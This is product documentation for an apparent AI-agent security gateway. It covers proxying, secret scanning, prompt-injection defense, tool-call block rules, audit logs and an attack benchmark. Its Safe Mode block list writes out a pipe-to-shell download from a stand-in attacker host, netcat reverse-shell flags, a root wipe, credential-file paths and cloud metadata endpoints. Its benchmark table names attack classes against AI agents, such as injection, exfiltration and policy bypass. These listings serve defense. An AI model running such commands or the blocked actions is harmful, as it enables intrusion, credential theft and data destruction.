# Comprehensive Core Capabilities Guide

This guide provides a step-by-step walkthrough for every core capability offered by AgentWall. It covers all 10 capabilities including the **ADR (AI Detection & Response)** framework features — stateful sequence rules, security benchmarking, and the enhanced local dashboard. Commands are tailored to work smoothly across macOS, Linux, and Windows.

---

## 1. Observation & Routing (Local Proxy)

AgentWall can act as a local "shadow proxy" on your development machine, intercepting outbound Agent traffic and auto-generating security policies.

### Start the Shadow Proxy
**All OS (macOS, Linux, Windows):**
```bash
# For HTTP Agents
agentwall dev

# For Stdio Agents (e.g., Claude Desktop, Cursor)
agentwall dev --stdio -- npx -y @modelcontextprotocol/server-filesystem /workspace
```

### Route Agent Traffic
Set standard proxy variables in your terminal before running your AI agent:

**macOS / Linux (Bash / Zsh):**
```bash
export HTTP_PROXY=http://localhost:8080
export HTTPS_PROXY=http://localhost:8080
export AGENTWALL_PROXY_URL=http://localhost:8080
python my_agent.py
```

**Windows PowerShell:**
```powershell
$env:HTTP_PROXY="http://localhost:8080"
$env:HTTPS_PROXY="http://localhost:8080"
$env:AGENTWALL_PROXY_URL="http://localhost:8080"
python my_agent.py
```

**Windows Command Prompt (CMD):**
```cmd
set HTTP_PROXY=http://localhost:8080
set HTTPS_PROXY=http://localhost:8080
set AGENTWALL_PROXY_URL=http://localhost:8080
python my_agent.py
```

### Generate a Policy Draft
Once your agent has been observed, automatically draft a YAML security policy:

**macOS / Linux / Windows:**
```bash
agentwall generate-policy --decay-window 30
```

---

## 2. Enforcement (Centralized Gateway)

The centralized gateway actively enforces security policies in production environments. It supports TLS, strict tool allowlisting, and Zero-Downtime Policy Hot-Reloads.

### Start the Enforcement Gateway
**macOS / Linux / Windows:**
```bash
agentwall start --policy agentwall-policy.yaml --listen 0.0.0.0:8080
```

### Zero-Downtime Policy Hot-Reload
When you update `agentwall-policy.yaml`, you can reload the gateway without dropping active connections.

**Option A: Using Unix Signals (macOS & Linux Only)**
```bash
kill -SIGHUP $(pidof agentwall)
```

**Option B: Using the API Endpoint (Cross-Platform)**
* **macOS / Linux (Bash / Zsh):**
  ```bash
  curl -X POST http://localhost:8080/reload
  ```

* **Windows PowerShell:**
  ```powershell
  Invoke-RestMethod -Uri "http://localhost:8080/reload" -Method Post
  ```

* **Windows Command Prompt (CMD):**
  ```cmd
  curl.exe -X POST http://localhost:8080/reload
  ```

---

## 3. Data Loss Prevention (DLP)

AgentWall's DLP scanner automatically inspects outbound requests and inbound responses using 21 built-in regex patterns to detect API Keys (AWS, GitHub, Stripe, etc.), Private SSH Keys, and PII (Credit Cards, US SSN, etc.).

No explicit configuration is required. If your agent attempts to read a `.env` file containing an API key, AgentWall will immediately block the transaction and log the violation. 
*(Note: You can extend these rules using community YAML configurations loaded at startup).*

---

## 4. Injection Defense

AgentWall features a 6-pass normalizer (NFKC; zero-width stripping + Cyrillic homoglyph mapping; URL decode; Base64 decode; leetspeak; case-fold) and a 16-pattern injection scanner designed to block inbound tool responses and external payloads containing prompt injection attacks.

This capability is enabled by default in the Enforcement Gateway and requires no OS-specific configuration.

---

## 5. Safe Mode — Out-of-the-Box Protection (FR-303a)

Safe Mode is a separate enforcement layer from the injection scanner. It applies 15 tool-aware rules that block dangerous tool calls without any policy configuration. Each rule targets only the relevant parameter type (file path, command, or URL), minimizing false positives.

**Sensitive File Paths (10 rules):**
- Blocks access to SSH keys and directories (`.ssh/`, `id_rsa`, `id_ed25519`, `id_ecdsa`).
- Blocks `.env` files, AWS credentials (`.aws/credentials`), kubeconfig (`.kube/config`), `/etc/shadow`, Docker config (`.docker/config.json`), and Docker socket (`docker.sock`).

**Dangerous Commands (4 rules):**
- Blocks pipe-to-shell patterns (e.g., `curl https://evil.com | bash`, `wget ... | sh/python/perl/ruby`).
- Blocks netcat listeners/reverse shells (`nc -l`, `nc -e`).
- Blocks destructive root wipes (`rm -rf /`).

**Network / SSRF (1 rule):**
- Blocks requests to cloud metadata endpoints (`169.254.169.254`, `metadata.google.internal`).

Safe Mode runs before the policy engine — it protects agents even in shadow mode (`agentwall dev`) where no policy file is loaded. It is always enabled and requires no configuration.

---

## 5b. Stateful Sequence Rules (ADR Framework)

Beyond single-call blocking, AgentWall's **ADR Sequence Engine** detects multi-step attack patterns across a sliding-window session. Rules can enforce ordering constraints on tool call chains.

### How It Works
The `SessionTracker` maintains a per-session call history. The sequence engine evaluates each new call against configured rules — for example, blocking `execute_command` if it appears within 5 steps of `read_file` on a sensitive path.

### Define a Sequence Rule in Policy YAML
```yaml
sequence_rules:
  - id: "no-read-then-exec"
    description: "Block shell execution that follows a file read — common exfiltration pattern"
    window: 5          # Look back over last 5 tool calls
    pattern:
      - tool: read_file
      - tool: execute_command
    action: deny
    message: "Exfiltration chain detected: read_file → execute_command"

  - id: "no-repeated-http-post"
    description: "Block more than 3 HTTP POSTs within a 10-call window"
    window: 10
    pattern:
      - tool: http_post
      - tool: http_post
      - tool: http_post
    action: deny
    message: "Repeated outbound POST pattern blocked (possible data exfiltration loop)"
```

Sequence rule violations are surfaced in real time in the local dashboard as **Sequence Rule Violation Badges** and written to the audit log with the rule ID and matched pattern.

---

## 6. Compliance & Auditing

AgentWall writes cryptographically secure, HMAC-chained audit logs, and can push events directly to SIEMs (Splunk, Datadog, OpenSearch).

### Verify Log Integrity
Prove to auditors that a log hasn't been tampered with:
**All OS:**
```bash
agentwall verify-log audit.log
```

### Generate a JSON Session Report
**All OS:**
```bash
agentwall report audit.log
```

### Direct SIEM Export (e.g., Splunk)
Configure AgentWall to push logs directly to your SIEM via environment variables before starting the gateway:

**macOS / Linux:**
```bash
export AGENTWALL_SIEM_BACKEND=splunk
export AGENTWALL_SIEM_ENDPOINT=https://splunk.example.com:8088/services/collector/event
export AGENTWALL_SIEM_TOKEN="<SPLUNK_HEC_TOKEN>"
agentwall start --policy agentwall-policy.yaml
```

**Windows PowerShell:**
```powershell
$env:AGENTWALL_SIEM_BACKEND="splunk"
$env:AGENTWALL_SIEM_ENDPOINT="https://splunk.example.com:8088/services/collector/event"
$env:AGENTWALL_SIEM_TOKEN="<SPLUNK_HEC_TOKEN>"
agentwall.exe start --policy agentwall-policy.yaml
```

---

## 7. Agent Identity & Credential Governance

AgentWall eliminates long-lived secret sprawl by provisioning short-lived, scoped credentials for agents.

### Provision a Scoped Credential (1-hour TTL)
**All OS:**
```bash
agentwall identity create --agent my-agent --scope read-only --ttl 1h
```

### Force Credential Rotation
**All OS:**
```bash
agentwall identity rotate --agent my-agent
```

### Restrict Scope (Deny a specific tool)
**All OS:**
```bash
agentwall identity scope --agent my-agent --tool execute_shell --deny
```

### Audit & Inspect Identity
**All OS:**
```bash
agentwall identity inspect --credential <credential-id>
agentwall identity audit --agent my-agent --verify
```

---

## 8. Local Dashboard & ADR Security Widgets (`agentwall protect`)

AgentWall's Workstation Sidecar embedded local dashboard runs automatically at `http://127.0.0.1:8080` when you execute `agentwall protect`. It includes dedicated **ADR Benchmark** tabs and real-time security widgets, all served offline with zero external dependencies.

### ADR Dashboard Widgets

| Widget | Description |
|--------|-------------|
| **ADR Security Score Ring** | SVG gauge showing your overall ADR security grade (A/B/C) across 17 attack categories |
| **Real-Time Causal Trace Graph** | Live node graph of multi-turn tool execution paths (`read_file` → `list_dir` → `http_post`) |
| **Sequence Rule Violation Badges** | Live notification stream surfacing stateful sequence rule blocks in real time |
| **1-Click Policy Synthesis** | Displays auto-discovered tool call rules with a "Copy `agentwall-policy.yaml`" button |
| **ADR Benchmark Tab** | Full interactive report of the last `agentwall bench` run, embedded in the sidebar |

### Launch the Dashboard
**All OS (macOS, Linux, Windows):**
```bash
agentwall protect
# Dashboard auto-opens at http://127.0.0.1:8080 in Active Enforcement Mode
# Use 'agentwall protect --shadow' for observation-only mode
# (Note: 'agentwall dev' is deprecated in favor of 'agentwall protect')
```

### Deploying the Full Stack Dashboard via Helm (Production)

```bash
helm install agentwall ./chart \
  --namespace agentwall-system \
  --create-namespace \
  --set gateway.tls.enabled=true \
  --set gateway.tls.secretName=my-gateway-tls \
  --set dashboardApi.enabled=true \
  --set dashboardDb.enabled=true \
  --set dashboardFrontend.enabled=true \
  --set dashboardApi.oidc.issuer=https://your-idp.example.com \
  --set dashboardApi.oidc.clientId=agentwall-dashboard
```

### Deploying the Dashboard Locally (Docker Compose)
If you have Docker installed, you can spin up the full dashboard stack (Frontend, API, and DB) for local development.

**All OS (macOS, Linux, Windows via Docker Desktop):**
```bash
cd control-plane
docker compose up -d --build
```

---

## 9. Cloud Native (Kubernetes Operator)

AgentWall includes a Helm chart with a Kubernetes operator that automatically generates egress-deny `NetworkPolicy` rules for your cluster.

### Deploying via Helm
Assuming you have `helm` and `kubectl` configured:

**All OS:**
```bash
helm install agentwall ./chart \
  --namespace agentwall-system \
  --create-namespace \
  --set gateway.tls.enabled=true \
  --set gateway.tls.secretName=my-gateway-tls
```
*(When `spec.networkPolicy.enforced: true` is set, the operator ensures all outbound traffic that bypasses the AgentWall gateway is automatically dropped at the network layer).*

To also deploy the SaaS Dashboard alongside the gateway, add the dashboard flags — see [§8. Local Dashboard & ADR Security Widgets](#8-local-dashboard--adr-security-widgets-agentwall-dev) for the full Helm example with `dashboardApi.enabled`, `dashboardDb.enabled`, and `dashboardFrontend.enabled`.

---

## 10. ADR Security Benchmark (`agentwall bench`)

> **What is ADR?** ADR stands for **AI Detection & Response** — a security framework that stress-tests your agent gateway against real-world AI attack techniques across 17 categories.

The `agentwall bench` command runs an offline 303-task benchmark suite against a local AgentWall gateway instance. It measures how well your current policy and enforcement rules detect and block each attack class, producing an overall security grade (A/B/C) and a detailed HTML report.

### Run the Full Benchmark
**All OS:**
```bash
# Run all 303 tasks across all 17 attack categories
cargo run -- bench --full

# Or if installed via binary
agentwall bench --full
```

### What the Benchmark Tests

| # | Category | Description |
|---|----------|-------------|
| 1 | **Prompt Injection** | Attempts to hijack the agent's reasoning via injected instructions |
| 2 | **Tool Abuse** | Misuse of trusted tools (e.g., `read_file` to read secrets, `exec` to spawn shells) |
| 3 | **Data Exfiltration** | Patterns that attempt to send sensitive data to external endpoints |
| 4 | **SSRF** | Requests targeting internal network addresses and cloud metadata endpoints |
| 5 | **Privilege Escalation** | Attempts to invoke tools or read resources beyond the agent's credential scope |
| 6 | **Path Traversal** | Directory traversal attacks (`../../etc/passwd`, `..\windows\system32`) |
| 7 | **Secret Leakage** | Requests that trigger disclosure of keys, tokens, or environment variables |
| 8 | **Loop / Recursion** | Infinite agent self-invocation or tool call loops |
| 9 | **Multi-Step Chains** | Coordinated multi-turn sequences designed to bypass single-call detection |
| 10 | **Denial of Service** | High-frequency or expensive requests designed to exhaust resources |
| 11 | **Encoding Evasion** | Base64, URL-encoding, leetspeak, and Cyrillic homoglyph obfuscation |
| 12 | **Supply Chain** | Attacks via compromised MCP tool definitions or external resources |
| 13 | **Lateral Movement** | Sequential calls probing adjacent systems after initial access |
| 14 | **Credential Theft** | Attempts to access credential stores or token files |
| 15 | **Policy Bypass** | Direct attempts to manipulate or reload the policy engine |
| 16 | **Identity Spoofing** | Forged JWT or agent identity claims |
| 17 | **Indirect Injection** | Injection via tool response payloads (e.g., poisoned file content) |

### Reading the Report
After the benchmark completes, AgentWall writes an HTML report to `target/benchmark-report.html`:

```bash
# Open the report (macOS)
open target/benchmark-report.html

# Open the report (Linux)
xdg-open target/benchmark-report.html

# Open the report (Windows PowerShell)
Start-Process target/benchmark-report.html
```

The report includes:
- **Overall Grade** (A/B/C) with pass/fail counts
- **Per-category pass rates** with plain-English descriptions of what each category tests
- **Comparative baselines** against GuardAgent, LlamaFirewall, and ALRPHFS
- **Recommendations** for which policy rules to add to improve your score

The **ADR Benchmark tab** in the local dashboard (`http://127.0.0.1:8080`) also displays the latest report interactively.

---

## 11. Central Device Governance & Fleet Health

AgentWall Control Hub provides a dedicated **Device Governance** portal (`/admin/devices`) for registering developer endpoints, tracking active Sentry daemon heartbeats, and enforcing endpoint compliance across macOS, Windows, Linux, and WSL.

For complete API specifications and enrollment token parameters, see the [Team & Staging Control Hub Guide](team_hub_guide.md#6-central-device-governance--fleet-health).

### Generating One-Time Enrollment Tokens (OTET)
Admins can generate short-lived enrollment tokens via the Web Console (`+ Generate Enrollment Token`) or REST API:

**Linux / macOS (Bash / Zsh):**
```bash
curl -X POST http://localhost:8400/api/v1/admin/enrollment-tokens \
  -H "Authorization: Bearer <ADMIN_SESSION_TOKEN>" \
  -H "Content-Type: application/json" \
  -d '{"raw_token": "TOK-892A-3F91", "max_uses": 25, "ttl_hours": 24}'
```

**Windows (PowerShell):**
```powershell
Invoke-RestMethod -Uri "http://localhost:8400/api/v1/admin/enrollment-tokens" `
  -Method Post `
  -Headers @{ "Authorization" = "Bearer <ADMIN_SESSION_TOKEN>" } `
  -ContentType "application/json" `
  -Body '{"raw_token": "TOK-892A-3F91", "max_uses": 25, "ttl_hours": 24}'
```

### Onboarding Developer Workstations
Developers run the onboarding script with the generated token and Hub URL:

**Linux / macOS (Bash):**
```bash
curl -fsSL https://vexasec.io/install.sh | AGENTWALL_TOKEN="TOK-892A-3F91" AGENTWALL_HUB_URL="http://hub.yourdomain.com:8081" bash
```

**Windows (PowerShell):**
```powershell
$env:AGENTWALL_TOKEN = "TOK-892A-3F91"
$env:AGENTWALL_HUB_URL = "http://hub.yourdomain.com:8081"
irm https://vexasec.io/install.ps1 | iex
```

### Heartbeat Compliance States

| Status Badge | State Criteria | Operational Meaning |
|---|---|---|
| **`COMPLIANT`** (Green) | Heartbeat $\le 3\text{ min}$ AND $100\%$ MCP servers wrapped | Device active, full proxy & API access granted. |
| **`UNREACHABLE`** (Yellow) | $3\text{ min} < \text{Heartbeat} \le 10\text{ min}$ | Workstation is idle, asleep, or temporarily disconnected. |
| **`NON_COMPLIANT`** (Red) | Heartbeat $> 10\text{ min}$ OR unwrapped tools detected | **Zero-Trust Breach**: Unwrapped MCP server detected or device compromised/revoked. |

